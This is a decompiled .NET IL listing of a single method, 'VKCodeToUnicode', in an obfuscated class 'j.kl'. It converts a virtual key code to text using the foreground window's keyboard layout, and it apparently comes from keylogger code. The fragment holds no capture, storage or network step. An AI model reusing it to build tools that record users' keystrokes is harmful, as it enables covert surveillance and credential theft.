  .method private static string  VKCodeToUnicode(uint32 a) cil managed
  {
    // Code size       134 (0x86)
    .maxstack  7
    .locals init (string V_0,
             int32 V_1,
             uint8[] V_2,
             bool V_3,
             native int V_4,
             native int V_5,
             uint32 V_6,
             class [mscorlib]System.Text.StringBuilder V_7,
             class [mscorlib]System.Exception V_8,
             int32 V_9)
    .try
    {
      IL_0000:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor()
      IL_0005:  stloc.s    V_7
      IL_0007:  ldc.i4     0xff
      IL_000c:  newarr     [mscorlib]System.Byte
      IL_0011:  stloc.2
      IL_0012:  ldloc.2
      IL_0013:  call       bool j.kl::GetKeyboardState(uint8[])
      IL_0018:  stloc.3
      IL_0019:  ldloc.3
      IL_001a:  brtrue.s   IL_0024

      IL_001c:  ldstr      ""
      IL_0021:  stloc.0
      IL_0022:  leave.s    IL_0084

      IL_0024:  ldarg.0
      IL_0025:  ldc.i4.0
      IL_0026:  call       uint32 j.kl::MapVirtualKey(uint32,
                                                                  uint32)
      IL_002b:  stloc.s    V_6
      IL_002d:  call       native int j.OK::GetForegroundWindow()
      IL_0032:  stloc.s    V_4
      IL_0034:  ldloc.s    V_4
      IL_0036:  ldc.i4.0
      IL_0037:  stloc.s    V_9
      IL_0039:  ldloca.s   V_9
      IL_003b:  call       int32 j.kl::GetWindowThreadProcessId(native int,
                                                                            int32&)
      IL_0040:  stloc.1
      IL_0041:  ldloc.1
      IL_0042:  call       int32 j.kl::GetKeyboardLayout(int32)
      IL_0047:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
      IL_004c:  stloc.s    V_5
      IL_004e:  ldarg.0
      IL_004f:  ldloc.s    V_6
      IL_0051:  ldloc.2
      IL_0052:  ldloc.s    V_7
      IL_0054:  ldc.i4.5
      IL_0055:  ldc.i4.0
      IL_0056:  ldloc.s    V_5
      IL_0058:  call       int32 j.kl::ToUnicodeEx(uint32,
                                                               uint32,
                                                               uint8[],
                                                               class [mscorlib]System.Text.StringBuilder,
                                                               int32,
                                                               uint32,
                                                               native int)
      IL_005d:  pop
      IL_005e:  ldloc.s    V_7
      IL_0060:  callvirt   instance string [mscorlib]System.Text.StringBuilder::ToString()
      IL_0065:  stloc.0
      IL_0066:  leave.s    IL_0084

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0068:  dup
      IL_0069:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_006e:  stloc.s    V_8
      IL_0070:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0075:  leave.s    IL_0077

    }  // end handler
    IL_0077:  ldarg.0
    IL_0078:  conv.ovf.i4.un
    IL_0079:  box        [System.Windows.Forms]System.Windows.Forms.Keys
    IL_007e:  callvirt   instance string [mscorlib]System.Enum::ToString()
    IL_0083:  ret

    IL_0084:  ldloc.0
    IL_0085:  ret
  } // end of method kl::VKCodeToUnicode
